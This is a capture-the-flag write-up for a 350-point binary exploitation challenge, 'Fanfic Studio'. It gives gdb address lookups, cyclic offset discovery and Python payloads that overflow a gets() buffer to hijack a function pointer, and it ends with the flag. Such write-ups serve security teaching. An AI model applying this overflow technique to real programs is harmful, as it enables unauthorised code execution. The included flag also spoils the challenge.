# Fanfic Studio
Binary Exploitation - 350 points

## Challenge 
> Written by arxenix

>Go to [`/problems/fanfic`](./fanfic) to check out my cool fanfic writing tool. I expect you to send me some steamy fanfics of michael.

## Solution

#### Analysis

- In `1. Edit chapter`: vulnerable `gets()`:

- In `3. Publish fanfic`: access pointer `curr_ch->print_ch(i, curr_ch);`

#### Function Addresses

GDB to get address

	user72122@shell:/problems/fanfic$ gdb ./fanfic 

	gdb-peda$ info add give_flag
	Symbol "give_flag" is at 0x80487ef in a file compiled without debugging.

	gdb-peda$ info add validate 
	Symbol "validate" is at 0x80487b4 in a file compiled without debugging.

Convert to little endian

	>>> pwn.p32(0x80487ef) # give_flag
	'\xef\x87\x04\x08'

	>>> pwn.p32(0x80487b4) # validate
	'\xb4\x87\x04\x08'

#### Offset

strace to get offset value

	$ pwn cyclic 300


	$ strace ./fanfic 
	--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x61706361} ---
	+++ killed by SIGSEGV (core dumped) +++
	Segmentation fault (core dumped)


	$ pwn cyclic -l 0x61706361
	258

#### Payload for function address

	$ python -c 'print "A"*258 + "\xef\x87\x04\x08" ' > payload_flag.txt
	$ python -c 'print "A"*258 + "\xb4\x87\x04\x08" ' > payload_validate.txt

#### Setting argument for `validate()`

From source, we need to pass `0x40` into validate().

	int success = 0xFFFF;
	void validate(int ans) {
	    if ((ans ^ 0xDEADBEEF) == 0xDEADBEAF) {
	        success = 0xC001B4B3;
	    }
	}

Unfortunately we can't use ROP to set the argument. This is because we are overriding the `print_ch` pointer and not the return address of the function.

But, notice that when `curr_ch->print_ch(i, curr_ch);` is called, it passes `i` as the argument.

So if we set payload, it becomes `validate(i, curr_ch)`. So we just need to find out when `i = 0x40 = 64`. 

`i` is the count of chapters. Thus, we need to create 63 chapters. The 64th chapter will have the payload for `validate()` and 65th for `give_flag()`

#### Creating payload

Create 63 chapters and then edit on the 64th and 65th (since `gets` is used for editing and not during creating)

I'm too lazy to code up a script, hence I used simple text files. 

	$ (cat payload_part1.txt payload_validate.txt payload_part2.txt payload_flag.txt; cat) | ./fanfic 

And success, it tries to open the flag.


#### Get flag

Run the script on the server!
	
	user72122@shell:/problems/fanfic$ (cat ~/payload_part1.txt ~/payload_validate.txt ~/payload_part2.txt ~/payload_flag.txt; cat) | ./fanfic 
	...
	---------------
	Chapter 63: Chapter
	---------------
	Contents
	easyctf{h34p_expl01ts_ru1n1ng_my_f4nf1cs}

	user72122@shell:/problems/fanfic$ 

## Flag
`easyctf{h34p_expl01ts_ru1n1ng_my_f4nf1cs}`